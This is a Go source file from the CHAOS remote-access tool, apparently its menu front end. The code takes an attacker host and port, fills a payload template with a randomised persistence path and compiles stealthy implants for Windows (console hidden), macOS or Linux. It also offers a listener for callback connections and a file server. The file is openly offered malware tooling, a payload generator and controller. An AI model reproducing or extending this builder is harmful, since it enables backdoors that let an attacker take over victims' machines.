package ui

import (
	"fmt"
	"os"
	"os/exec"
	"runtime"
	"strings"

	prompt "github.com/c-bata/go-prompt"
	c "github.com/tiagorlampert/CHAOS/src/color"
	"github.com/tiagorlampert/CHAOS/src/completer"
	"github.com/tiagorlampert/CHAOS/src/network"
	"github.com/tiagorlampert/CHAOS/src/parameters"
	"github.com/tiagorlampert/CHAOS/src/serve"
	"github.com/tiagorlampert/CHAOS/src/util"
)

func StartMenu() {

	ShowLogo()
	ShowMenu()

	cmd := prompt.Input(util.BEGIN_NAME, completer.HostCompleter)

	p := parameters.HostParams{}

	valuesArray := strings.Fields(cmd)
	for _, v := range valuesArray {

		if strings.Contains(v, "generate") {
			p.Generate = true
		}

		if strings.Contains(v, "listen") {
			p.Listen = true
		}

		if strings.Contains(v, "serve") {
			p.Serve = true
		}

		if strings.Contains(v, "exit") {
			p.Exit = true
		}

		if strings.Contains(v, "lhost=") {
			p.LHost = util.After(v, "lhost=")
		}

		if strings.Contains(v, "lport=") {
			p.LPort = util.After(v, "lport=")
		}

		if strings.Contains(v, "fname=") {
			p.FName = util.After(v, "fname=")
		}

		if strings.Contains(v, "--windows") {
			p.Windows = true
		}

		if strings.Contains(v, "--macos") {
			if runtime.GOOS != "darwin" {
				fmt.Println("")
				fmt.Print(c.YELLOW, " [!] To generate a payload for MacOS you need compile from a MacOS!")
				fmt.Println("")
				fmt.Println("")
				fmt.Print(c.WHITE, " [i] Press [ENTER] key to continue...")
				util.PauseAwaitKeyPressed()
				util.ClearScreen()
				StartMenu()
			} else {
				p.MacOS = true
			}
		}

		if strings.Contains(v, "--linux") {
			p.Linux = true
		}
	}

	if p.Generate {
		fmt.Println("")
		// Check if lhost are defined
		if p.LHost == "" {
			fmt.Print(c.YELLOW, " [!] lhost are required!")
			util.WaitTime(2)
			util.ClearScreen()
			StartMenu()
		} else { // Go ahead

			// Generate path name randomly
			pathPersistence := util.GeneratePath(8)

			// Set filename output
			// If filename is empty, by default it receive "payload"
			fileName := "chaos"
			if p.FName == "" {
				fmt.Println(c.YELLOW, "[i] Default fname defined ("+fileName+").")
			} else {
				fileName = p.FName
			}

			// Set lport
			// If lport is empty, by default it receive "8080"
			lport := "8080"
			if p.LPort == "" {
				fmt.Println(c.YELLOW, "[i] Default lport defined ("+lport+").")
			} else {
				lport = p.LPort
			}

			// Set OS target
			// If OS target is empty, by default it receive "Windows"
			osTarget := "Windows"
			osTargetExt := ".exe"
			if p.Windows {
				osTarget = "Windows"
				osTargetExt = ".exe"
			} else if p.MacOS {
				osTarget = "MacOS"
				osTargetExt = ""
			} else if p.Linux {
				osTarget = "Linux"
				osTargetExt = ""
			} else {
				fmt.Println(c.YELLOW, "[i] Default OS Target defined ("+osTarget+").")
			}

			fmt.Println("")
			fmt.Println(c.GREEN, "+------------------------------------------+")
			fmt.Println(c.GREEN, "|            PAYLOAD PARAMETERS            |")
			fmt.Println(c.GREEN, "+------------------------------------------+")
			fmt.Print(c.GREEN, "  lhost: ")
			fmt.Println(c.WHITE, p.LHost)
			fmt.Print(c.GREEN, "  lport: ")
			fmt.Println(c.WHITE, lport)
			fmt.Print(c.GREEN, "  fname: ")
			fmt.Println(c.WHITE, fileName)
			fmt.Print(c.GREEN, "  OS Target: ")
			fmt.Println(c.WHITE, osTarget)
			fmt.Println(c.GREEN, "+------------------------------------------+")
			fmt.Println("")
			fmt.Print(c.CYAN, " [?] The information above is correct? (y/n): ")
			isCorrect := util.ReadLine()

			if isCorrect == "y" || isCorrect == "Y" {

				if osTarget == "Windows" {
					util.TemplateTextReplace(p.LHost, lport, fileName+".exe", pathPersistence, fileName, osTarget)

					fmt.Println("")
					fmt.Println(c.GREEN, "[*] Compiling...")
					cmd := exec.Command("sh", "-c", "GOOS=windows GOARCH=386 go build -ldflags \"-s -w -H=windowsgui\" -o \"build/"+osTarget+"/"+fileName+"/"+fileName+osTargetExt+"\" build/"+osTarget+"/"+fileName+"/"+fileName+".go")

					output, _ := cmd.CombinedOutput()

					if util.CheckIfFileExist("build/" + osTarget + "/" + fileName + "/" + fileName + osTargetExt) {
						fmt.Println(c.GREEN, "[*] Generated at build/"+osTarget+"/"+fileName+"/"+fileName+osTargetExt)
					} else {
						fmt.Println(c.RED, "[!] File not found! There's a problem with compiling. "+string(output))
					}
				} else if osTarget == "MacOS" {
					util.TemplateTextReplace(p.LHost, lport, fileName, pathPersistence, fileName, osTarget)

					fmt.Println("")
					fmt.Println(c.GREEN, "[*] Compiling...")
					cmd := exec.Command("sh", "-c", "go build -ldflags \"-s -w\" -o \"build/"+osTarget+"/"+fileName+"/"+fileName+osTargetExt+"\" build/"+osTarget+"/"+fileName+"/"+fileName+".go")

					output, _ := cmd.CombinedOutput()

					if util.CheckIfFileExist("build/" + osTarget + "/" + fileName + "/" + fileName + osTargetExt) {
						fmt.Println(c.GREEN, "[*] Generated at build/"+osTarget+"/"+fileName+"/"+fileName+osTargetExt)
					} else {
						fmt.Println(c.RED, "[!] File not found! There's a problem with compiling. "+string(output))
					}
				} else if osTarget == "Linux" {
					util.TemplateTextReplace(p.LHost, lport, fileName+".exe", pathPersistence, fileName, osTarget)

					fmt.Println("")
					fmt.Println(c.GREEN, "[*] Compiling...")
					cmd := exec.Command("sh", "-c", "go build -ldflags \"-s -w\" -o \"build/"+osTarget+"/"+fileName+"/"+fileName+osTargetExt+"\" build/"+osTarget+"/"+fileName+"/"+fileName+".go")

					output, _ := cmd.CombinedOutput()

					if util.CheckIfFileExist("build/" + osTarget + "/" + fileName + "/" + fileName + osTargetExt) {
						fmt.Println(c.GREEN, "[*] Generated at build/"+osTarget+"/"+fileName+"/"+fileName+osTargetExt)
					} else {
						fmt.Println(c.RED, "[!] File not found! There's a problem with compiling. "+string(output))
					}
				}

				fmt.Println("")
				fmt.Print(c.WHITE, " [i] Press [ENTER] key to continue...")
				util.PauseAwaitKeyPressed()
				util.ClearScreen()
				StartMenu()
			} else if isCorrect == "n" || isCorrect == "N" {
				fmt.Print(c.YELLOW, " [i] Cleaning...")
				util.WaitTime(1)
				util.ClearScreen()
				StartMenu()
			}
		}

	} else if p.Listen {
		fmt.Println("")
		// Check if lport are defined
		if p.LPort == "" {
			fmt.Print(c.YELLOW, " [!] lport are required!")
			util.WaitTime(2)
			util.ClearScreen()
			StartMenu()
		}

		// Await for External Connection
		util.ClearScreen()
		ShowLogo()
		network.AwaitForExternalConnection(p.LPort)

	} else if p.Serve {
		util.ClearScreen()
		ShowLogo()
		serve.ServeFiles()
	} else if p.Exit {
		util.ClearScreen()
		fmt.Println("Bye, See you later!")
		os.Exit(0)
	} else {
		fmt.Println("")
		fmt.Print(c.RED, " [!] Invalid parameter!")

		util.WaitTime(3)
		util.ClearScreen()
		StartMenu()
	}
}
